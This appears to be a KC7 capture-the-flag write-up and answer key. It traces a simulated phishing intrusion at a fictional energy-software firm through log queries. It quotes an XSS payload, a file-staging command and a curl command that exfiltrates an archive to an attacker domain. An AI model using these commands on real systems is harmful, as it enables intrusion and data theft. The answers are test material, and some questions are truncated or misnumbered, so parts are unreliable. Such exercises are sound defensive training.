# KC7-Solvi Systems 

## About this investigation
Solvi Systems, a software company, is a key player is South Africa's energy industry ⚡.

With its cutting-edge Docks software, Solvi Systems has become indispensable to major power and utility companies, shaping the distribution of energy in not just South Africa, but across neighboring nations like Mozambique, Eswatini, Zimbabwe, and Namibia. 🌍

However, the interconnectedness of this power grid also brings 😱 vulnerability.

In this module, you'll help investigate an intrusion against Solvi Systems, and find out how attackers may have leveraged their access to discover vulnerabilities in the DOCKS software.


**Ps** : i was lazy on this bit so no images ¯_(ツ)_/

## Welcome to Solvi Systems!

Solvi Systems is a software company that plays a pivotal role in shaping the future of the energy sector in South Africa. At the heart of Solvi Systems' operations is its Docks software, a critical component used by major power and utility companies.

To start your investigation, you will need access to the company's pool of data!

Login to Azure Data Explorer (ADX). This is where you will find our TOP SECRET data. You will need a Microsoft account (hotmail, outlook, O365..) We will use ADX to run queries that will help us answer these questions


- Q1 : How many employees work at Solvi Systems?

```
Employees
| count 
```

- Q2 : What is the CTO's name?

```
Employees
| where role contains "CTO"
```

- Q3 : How many emails did alexis khoza receive ? 
```
Email
| where recipient == "alexis_khoza@solvisystems.com"
| count
```

- Q4 : How many distinct senders were seen in the email logs from eskom.co.za?

```
Email
| where sender has "eskom.co.za"
| distinct sender
| count
```

- Q5 : How many distinct websites did “Alexis Khoza” visit?

```
OutboundNetworkEvents
| where src_ip == "10.10.0.7"
| distinct url
```

- Q6 : How many distinct domains in the PassiveDns records contain the word “real”?
```
PassiveDns
| where domain contains "real"
| distinct domain
```

- Q7 : What IPs did the domain “bit.ly” resolve to (enter any one of them)?
```
PassiveDns
| where domain contains "bit.ly"
| distinct ip
```

- Q8 : How many distinct URLs did employees with the first name "Mary" Visit?

```
let all_mary_ips = 
Employees
| where name has "Mary"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (all_mary_ips)
|distinct url
```

- Q9 : How many authentication attempts did we see to the accounts of employees with the first name Mary?


```let auth_mary = 
Employees
| where name has "Mary"
| distinct username;
AuthenticationEvents
| where username in (auth_mary)
| count
```


- Q10 : You got an alert from your Web Application Firewall (WAF) appliance that someone may be trying to compromise your Solvi System's website!
```
{
   description: "DETECTION RULE TRIGGERED",
   severity: "HIGH",
   rule_description: "SUSPICIOUS TEXT IN HTTP REQUEST",
   data: https://www.solvisystems.com/feedback?message=</script>. 
 <script>alert('xss')</script>
}
```

What kind of attack does the alert suggest happened?

  Ans : xss 

- Q11 : What javascript command was the attacker trying to run?
  Ans : alert()


- Q12 : What response code did they receive from the website?

  Ans : 404

- Q13 : What user agent did the attackers use to make the web requests in this attack? Enter only the initial part of the user agent (XXXXX/N.NN).

  Ans : Opera/8.64

- Q14 : On what day did the attack happen? Give the timestamp in the format YYYY-MM-DD.

  Ans : 2024-05-03 

- Q15 :  How many malicious requests did the attacker make in total?

  Ans :  9

- Q16 : Were any of these attacks successful? (yes/no)

  Ans : no

- Q17 : What IP addresses did the requests originate from? (Enter any of them.)

  Ans : 105.78.23.64

- Q18 : How many total records do we have of them browsing Solvi Systems?

  Ans : 64
```
InboundNetworkEvents
| where user_agent contains "opera/8.64"
```

- Q19 : What is the timestamp of the first web request the threat actor sent to Solvi System's website?

  Ans : 2024-05-01T00:00:00


- Q20 : Which product did the threat actors research before the day that they sent the malicious web requests?

  Ans : DOCKS

- Q21 : How many distinct domains do the ip addresses used by the threat actor resolve to?
```
let mal_ip=
InboundNetworkEvents
| where user_agent contains "opera/8.64"
|  distinct src_ip;
PassiveDns
| where ip in (mal_ip)
| distinct domain
```

- Q22 : How many emails associated with these domains did
  Ans : 56

- Q23 : How many distinct email addresses did the threat actor use?

  Ans : 3
```
Email
| where link contains "eco-awareness-update.net"
   or link contains "news-on-industry.com"
   or link contains "energy-trends4u.net"
| distinct sender  
```

- Q24 : How many distinct filenames were observed in the links in these emails?

  Ans : 3


- Q25 : How many different roles were targeted with these emails?

  Ans : 5

```
let mal_dom=
Email
| where link contains "eco-awareness-update.net"
   or link contains "news-on-industry.com"
   or link contains "energy-trends4u.net"
| distinct recipient;
Employees
| where email_addr  in (mal_dom)
| distinct role  
```

- Q26 : How many Customer Support Specialist employees received malicious emails?

  Ans : 27

```
let mal_dom=
Email
| where link contains "eco-awareness-update.net"
   or link contains "news-on-industry.com"
   or link contains "energy-trends4u.net"
| distinct recipient;
Employees
| where email_addr  in (mal_dom)
| where role == "Customer Support Specialist"
```

- Q28 : Among these job roles, which word is shared by three of them?

  Ans : DOCKS

- Q29 : What was the timestamp of the first email the threat actor sent?

  Ans :  2024-05-01T15:51:41
```
Email
| where sender contains "news@eco-awareness-updates.net"
```

- Q30 : What is the recipient's email address?

  Ans : carla_wharton@solvisystems.com

- Q31 : What is that employee's name?
 
  Ans : carla wharton


- Q32 : What was the sender address of that email?

  Ans : news@eco-awareness-updates.net

- Q33 : What was the reply to address?

  Ans : electric_updates@gmail.com


- Q34 : What was the subject of that email?

  Ans : [EXTERNAL] Business Opportunity: Two major energy companies merging",

- Q35 : What link was observed in the email?

  Ans : http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx


- Q36 : Did Carla click on the link in email? If so when?

```
OutboundNetworkEvents
| where src_ip contains "10.10.0.164"
| where url contains "http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx"
```

- Q37 : Did Carla click on the link in email? If so when?

  Ans : 2024-05-01T15:57:41


- Q38 : What file was observed on Carla's machine shortly after she executed the docx file?

  Ans : ecobug.exe

- Q39 : What was the hash of the file?

  Ans : 1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252

- Q40 : How many records do we have of this file being created on Solvi Systems computers?

  Ans : 39


- Q41 : What IP address does ecobug.exe connect to in order to establish persistence?

  Ans : 98.117.26.236

```
ProcessEvents
| where hostname =="JUSP-LAPTOP"
| where process_commandline contains "eco"
```
```
FileCreationEvents
| where filename contains "ecobug.exe"
```
- Q41 : What is the port number that is used?

  Ans : 1337


- Q42 : How many times does Carla's machine connect to the suspicious IP address?

  Ans :  24

```
NetworkFlow
| where src_ip contains "10.10.0.164"
| where dest_ip contains "98.117.26.236"
| where dest_port == "1337"
```

- Q43 : How many times a day does Carla's machine make its recurring connection to the suspicious IP?

  Ans : 1

- Q44 : At what time does this connection take place? (format hh:mm:ss)

  Ans :17:38:25

- Q45 : How many total connections do we see between this IP and Solvi Systems employee machines?

 Ans : 470

```
NetworkFlow
| where dest_ip contains "98.117.26.236"
| where dest_port == "1337"
```

- Q46 : How many distinct employee machines are involved in those connections?

  Ans : 38

```
NetworkFlow
| where dest_ip contains "98.117.26.236"
| where dest_port == "1337"
| distinct  src_ip
```


- Q47 : What is the name of the newly created user?

  Ans : gu@rd!an

```
ProcessEvents
| where process_commandline contains "user"
| where parent_process_name contains "cmd"
 or parent_process_name contains "powershell"
| where timestamp >= datetime(2024-05-02T17:38)
```
or 
```
ProcessEvents
| where hostname =="JUSP-LAPTOP" and scroll through
```
- Q48 : What is that user's password?

  Ans : abc1toothree

- Q49 : What was the last discovery command that the adversaries ran?

  Ans : net use
```
ProcessEvents
| where process_commandline contains  "net use"
```

- Q50 : How many distinct commands containing the term net use were run on SolviSystem devices?

  Ans :  2
```
ProcessEvents
| where process_commandline has  "net use"
```
- Q51 : What new command using net use did we find?

  Ans : net use /PERSISTENT:YES
```
ProcessEvents
| where process_commandline contains  "net use /PERSISTENT:YES"
```

- Q51 : How many distinct hosts was this command run on?

  Ans : 3

```
ProcessEvents
| where process_commandline contains  "net use /PERSISTENT:YES"
| distinct hostname
```

- Q52 : What is the timestamp for the first time this command was run?

  Ans : 2024-05-27T16:23:10

- Q53 : What is the hostname from that timestamp?

  Ans : SJ9V-MACHINE


- Q54 : Who is the employee associated with that hostname?

  Ans : Alexei Petrov


- Q55 : What is that employee's role?

  Ans : Docks Customer Success Manager


- Q56 : What is the command used to copy files related to SoftwareDevelopment?

```
 Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs
```

- Q57 : What is the name of the archive file containing the copied documents?

  Ans : CollectedData.zip

- Q58 : The next day the data was exfiltrated using what command?

  Ans : ```curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload```

- Q59 : How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?

  Ans : 3
```
ProcessEvents
| where process_commandline contains "https://api.eco-awareness-update.net"
```

- Q60 : What was the subject of those emails?

  Ans : Do you know where the DOCKS software documentation is stored? 🤪

```
Email
| where sender contains "alexei"
|where subject contains "software"
```


- Q61 : The threat actors were observed reading an "internal process" document from an internal portal called ____.solvisystems.com

  Ans : devportal.solvisystems.com
```
InboundNetworkEvents
| where url contains ".solvisystems.com"
| distinct url
```
### Notes
- user of interest
```
{
  "hire_date": "2021-05-24 00:00:00+00:00",
  "name": "Alexis Khoza",
  "user_agent": "Mozilla/5.0 (Windows NT 6.2; rv:50.0) Gecko/20100101 Firefox/50.0",
  "ip_addr": "10.10.0.7",
  "email_addr": "alexis_khoza@solvisystems.com",
  "company_domain": "solvisystems.com",
  "username": "alkhoza",
  "role": "CTO",
  "hostname": "7FVW-LAPTOP"
}
```
```
{
  "hire_date": "2023-01-25 00:00:00+00:00",
  "name": "Carla Wharton",
  "user_agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/6.0)",
  "ip_addr": "10.10.0.164",
  "email_addr": "carla_wharton@solvisystems.com",
  "company_domain": "solvisystems.com",
  "username": "cawharton",
  "role": "Sales Representative",
  "hostname": "JUSP-LAPTOP"
}
```
```
{
  "hire_date": "2023-03-01 00:00:00+00:00",
  "name": "Alexei Petrov",
  "user_agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.185 Safari/537.36",
  "ip_addr": "10.10.0.3",
  "email_addr": "alexei_petrov@solvisystems.com",
  "company_domain": "solvisystems.com",
  "username": "alpetrov",
  "role": "Docks Customer Success Manager",
  "hostname": "SJ9V-MACHINE"
}
```
### Mal Domains
- energy-trends4u.net
- news-on-industry.com
- eco-awareness-update.net

### Mal Emails
- news@eco-awareness-updates.net
- energy_industry_news@protonmail.com
- electric_updates@gmail.com

